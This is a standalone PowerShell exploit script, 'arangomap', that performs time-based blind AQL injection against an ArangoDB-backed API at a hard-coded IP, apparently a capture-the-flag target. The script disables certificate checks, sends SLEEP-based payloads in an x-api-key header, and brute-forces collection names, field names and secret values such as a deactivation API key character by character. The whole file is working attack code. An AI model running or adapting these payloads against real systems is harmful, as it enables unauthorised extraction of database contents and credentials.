```
function arangomap {
    param (
        [Parameter(Mandatory=$false)]
        [string]$uuid,
        
        [Parameter(Position=0)]
        [ValidateSet("help", "fields", "collections", "values")]
        [string]$Command = "help",

        [Parameter(Position=1)]
        [string]$Target,

        [Parameter(Position=2)]
        [string]$Prefix = "",

        [Parameter(Position=3)]
        [string]$ValuePrefix = ""
    )
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    
    function Test-TimeBasedInjection {
        param (
            [string]$payload,
            [int]$sleepTime = 2
        )
        
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("x-api-key", $payload)
        
        $start = Get-Date
        
        try {
            $client.DownloadString("https://34.173.241.47/api/v1/frostbitadmin/bot/$uuid/deactivate?debug=true")
        } catch [System.Net.WebException] {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $response = $reader.ReadToEnd()
        }
        $duration = ((Get-Date) - $start).TotalSeconds
        
        return @{
            Success = $duration -gt $sleepTime
            Duration = $duration
            Response = $response
        }
    }
    
    function Start-Bruteforce {
        param (
            [string]$Mode,
            [string]$Target,
            [string]$Prefix,
            [scriptblock]$PayloadGenerator
        )

        $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_-$@/[]{}'
        $current_prefixes = @($Prefix)
        $found_items = @()
        
        try {
            while ($current_prefixes.Count -gt 0) {
                $found_new = @()
                
                foreach ($prefix in $current_prefixes) {
                    Write-Host "`nTesting extensions of: '$prefix'"
                    
                    foreach ($char in $chars.ToCharArray()) {
                        $test = $prefix + $char
                        $payload = $PayloadGenerator.Invoke($test)
                        Write-Host "Testing: $test" -NoNewline
                        
                        $result = Test-TimeBasedInjection -payload $payload
                        
                        if ($result.Success) {
                            Write-Host " - FOUND!" -ForegroundColor Green
                            $found_new += $test
                            
                            # Test if this is also a complete name
                            $payload = $PayloadGenerator.Invoke($test, $true)
                            $result = Test-TimeBasedInjection -payload $payload
                            
                            if ($result.Success) {
                                Write-Host "Complete $Mode found: $test" -ForegroundColor Green
                                $found_items += $test
                            }
                        } else {
                            Write-Host " - no" -ForegroundColor Gray
                        }
                        Start-Sleep -Milliseconds 500
                    }
                    
                    # Test if current prefix is complete
                    if ($prefix -ne '' -and -not $found_new.Contains($prefix + $chars[0])) {
                        $payload = $PayloadGenerator.Invoke($prefix, $true)
                        $result = Test-TimeBasedInjection -payload $payload
                        
                        if ($result.Success) {
                            Write-Host "Complete $Mode found: $prefix" -ForegroundColor Green
                            $found_items += $prefix
                        }
                    }
                }
                
                if ($found_new.Count -eq 0) { break }
                $current_prefixes = $found_new
            }
        }
        catch [System.Management.Automation.PipelineStoppedException] {
            Write-Host "`nBruteforce interrupted by user" -ForegroundColor Yellow
            Write-Host "Items found so far:" -ForegroundColor Cyan
            $found_items | ForEach-Object { Write-Host "- $_" -ForegroundColor Green }
            exit
        }
        
        return $found_items
    }
    
    function Show-Help {
        Write-Host " "
        Write-Host "Usage:" -ForegroundColor Yellow
        Write-Host "  arangomap -uuid <uuid> collections [prefix]                   : Bruteforce collection names"
        Write-Host "  arangomap -uuid <uuid> fields <collection> [prefix]           : Bruteforce field names in collection"
        Write-Host "  arangomap -uuid <uuid> values <collection> <field> [prefix]   : Bruteforce a field's value in collection"
        Write-Host ""
        Write-Host "Examples:" -ForegroundColor Yellow
        Write-Host "  arangomap -uuid c013b20d-c25c-4f58-97b5-2d114f8476fb collections conf"
        Write-Host "  arangomap -uuid c013b20d-c25c-4f58-97b5-2d114f8476fb fields config deactiv"
        Write-Host "  arangomap -uuid c013b20d-c25c-4f58-97b5-2d114f8476fb values config deactivate_api_key abe"
        Write-Host " "
        return
    }
    
    # Show help if no uuid is provided
    if (-not $uuid) {
        Show-Help
        return
    }
    
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        
        if ($Command -eq "help") {
            Show-Help
            return
        }
        
        switch ($Command.ToLower()) {
            "collections" {
                # Use Target as Prefix if provided, otherwise use Prefix
                $searchPrefix = if ($Target) { $Target } else { $Prefix }
                Write-Host "Bruteforcing collection names starting with: $searchPrefix" -ForegroundColor Yellow
                $collections = Start-Bruteforce -Mode "collection" -Prefix $searchPrefix -PayloadGenerator {
                    param($test, $exact = $false)
                    $match = if ($exact) { "`"$test`"" } else { "`"$test" }
                    return "' || (CONTAINS(TO_STRING(COLLECTIONS()), '$match') ? SLEEP(3) : SLEEP(0)) || '"
                }
                
                Write-Host "`nFound Collections:" -ForegroundColor Cyan
                $collections | ForEach-Object { Write-Host "- $_" -ForegroundColor Green }
            }

            "fields" {
                if (-not $Target) {
                    Write-Host "Error: Collection name required" -ForegroundColor Red
                    Show-Help
                    return
                }

                # Verify collection exists
                Write-Host "Verifying collection '$Target' exists..." -ForegroundColor Yellow
                $payload = "' || (CONTAINS(TO_STRING(COLLECTIONS()), '`"$Target`"') ? SLEEP(3) : SLEEP(0)) || '"
                $result = Test-TimeBasedInjection -payload $payload
                
                if (-not $result.Success) {
                    Write-Host "Error: Collection '$Target' not found!" -ForegroundColor Red
                    return
                }
                
                Write-Host "Collection found! Starting field bruteforce..." -ForegroundColor Green
                Write-Host "Bruteforcing field names starting with: $Prefix" -ForegroundColor Yellow
                
                $fields = Start-Bruteforce -Mode "field" -Target $Target -Prefix $Prefix -PayloadGenerator {
                    param($test, $exact = $false)
                    if ($exact) {
                        return "' || (REGEX_TEST(TO_STRING(ATTRIBUTES(doc)), '`"$test`"') ? SLEEP(3) : SLEEP(0)) || '"
                    } else {
                        return "' || (REGEX_TEST(TO_STRING(ATTRIBUTES(doc)), '`"$test') ? SLEEP(3) : SLEEP(0)) || '"
                    }
                }
                
                Write-Host "`nFound Fields in collection '$Target':" -ForegroundColor Cyan
                $fields | ForEach-Object { Write-Host "- $_" -ForegroundColor Green }
            }

            "values" {
                if (-not $Target -or -not $Prefix) {
                    Write-Host "Error: Both collection name and field name are required" -ForegroundColor Red
                    Show-Help
                    return
                }

                # Verify collection exists
                Write-Host "Verifying collection '$Target' exists..." -ForegroundColor Yellow
                $payload = "' || (CONTAINS(TO_STRING(COLLECTIONS()), '`"$Target`"') ? SLEEP(3) : SLEEP(0)) || '"
                $result = Test-TimeBasedInjection -payload $payload
                
                if (-not $result.Success) {
                    Write-Host "Error: Collection '$Target' not found!" -ForegroundColor Red
                    return
                }

                # Verify field exists in collection
                Write-Host "Verifying field '$Prefix' exists in collection..." -ForegroundColor Yellow
                $payload = "' || (REGEX_TEST(TO_STRING(ATTRIBUTES(doc)), '`"$Prefix`"') ? SLEEP(3) : SLEEP(0)) || '"
                $result = Test-TimeBasedInjection -payload $payload
                
                if (-not $result.Success) {
                    Write-Host "Error: Field '$Prefix' not found in collection '$Target'!" -ForegroundColor Red
                    return
                }

                # Now bruteforce the value
                $fieldName = $Prefix
                Write-Host "Collection and field verified! Starting value bruteforce..." -ForegroundColor Green
                Write-Host "Bruteforcing value for field '$fieldName' in collection '$Target' starting with: $ValuePrefix" -ForegroundColor Yellow
                $knownValue = $ValuePrefix
                $found = $true
                
                try {
                    while ($found) {
                        $found = $false
                        foreach ($char in 'abcdefghijklmnopqrstuvwxyz0123456789-'.ToCharArray()) {
                            $test = $knownValue + $char
                            Write-Host "Testing value: $test" -NoNewline
                            
                            # First check
                            $payload = "' || (LIKE(doc.$fieldName, '$test%') ? SLEEP(3) : SLEEP(0)) || '"
                            $result = Test-TimeBasedInjection -payload $payload
                            
                            if ($result.Success) {
                                # Double check the match
                                Start-Sleep -Milliseconds 500  # Small delay between checks
                                $payload = "' || (LIKE(doc.$fieldName, '$test%') ? SLEEP(3) : SLEEP(0)) || '"
                                $confirmResult = Test-TimeBasedInjection -payload $payload
                                
                                if ($confirmResult.Success) {
                                    Write-Host " - MATCH!" -ForegroundColor Green
                                    $knownValue = $test
                                    $found = $true
                                    break
                                } else {
                                    Write-Host " - false positive" -ForegroundColor Yellow
                                }
                            } else {
                                Write-Host " - no" -ForegroundColor Gray
                            }
                            Start-Sleep -Milliseconds 500
                        }
                    }
                }
                catch [System.Management.Automation.PipelineStoppedException] {
                    Write-Host "`nValue bruteforce interrupted by user" -ForegroundColor Yellow
                    Write-Host "Value found so far: $knownValue" -ForegroundColor Green
                    exit
                }
                
                Write-Host "`nFound value: $knownValue" -ForegroundColor Green
            }

            default {
                Show-Help
                return
            }
        }
    }
    catch {
        Write-Host "`nError occurred: $($_.Exception.Message)" -ForegroundColor Red
        Show-Help
        return
    }
}

# arangomap -uuid c013b20d-c25c-4f58-97b5-2d114f8476fb collections conf

```